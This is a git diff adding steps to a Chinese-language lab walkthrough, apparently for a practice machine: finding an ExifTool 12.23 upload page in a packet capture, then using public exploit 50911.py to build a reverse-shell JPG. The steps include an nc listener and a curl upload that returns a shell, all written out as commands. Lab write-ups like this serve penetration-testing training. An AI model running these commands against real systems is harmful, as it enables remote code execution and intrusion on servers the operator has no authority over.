@@ -42,33 +42,73 @@ passive
 
 <figure><img src="../.gitbook/assets/5 (1).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
+```bash
+// FTP服务中：
+get backup
+// Kali本机中，检查该文件的属性：
+file backup
+```
 
 ### 漏洞查找
 
+使用Wireshark打开backup文件后，过滤HTTP数据包，发现了：
 
+* <mark style="color:red;">**/exiftest.php**</mark>：一个上传图片的路径
+* 已成功上传了一个testme.jpg的图片
+* 使用的是<mark style="color:red;">**ExifTool**</mark>，其版本号为：<mark style="color:red;">**12.23**</mark>
+
+<figure><img src="../.gitbook/assets/7 (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/8 (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/9 (1).png" alt=""><figcaption></figcaption></figure>
+
+尝试查找ExifTool 12.23的公开已知漏洞，发现确实有一个任意代码执行的漏洞，将其下载后发现是一个用于将反弹shell的payload写入一个jpg文件的脚本：
+
+```bash
+searchsploit exiftool 12.23
+```
+
+<figure><img src="../.gitbook/assets/10 (1).png" alt=""><figcaption></figcaption></figure>
 
 ### 漏洞利用
 
+```
+// 将利用脚本下载到Kali本地：
+searchsploit -m 50911.py .
+// 查看其使用方法：
+python3 50911.py -h
+// 制作payload，得到名为image.jpg的图片文件:
+python3 50911.py -s 192.168.45.200 4444
+```
 
+<figure><img src="../.gitbook/assets/11 (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/12 (1).png" alt=""><figcaption></figcaption></figure>
 
 ### GET SHELL
 
+首先在Kali本机监听与payload对应的端口：4444
 
+```bash
+// Kali本机：
+nc -lvnp 4444
+```
 
+然后将制作好的payload（image.jpg）上传到目标，等待反弹回来的shell：
 
+```bash
+// 在payload所在的文件夹
+curl -v -F myFile=@image.jpg http://192.168.160.183/exiftest.php
+```
+
+<figure><img src="../.gitbook/assets/13 (1).png" alt=""><figcaption></figcaption></figure>
+
+成功获得反弹shell，并查找到local.txt文件：
+
+<figure><img src="../.gitbook/assets/15.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/14 (1).png" alt=""><figcaption></figcaption></figure>
 
 ## 提升权限
 
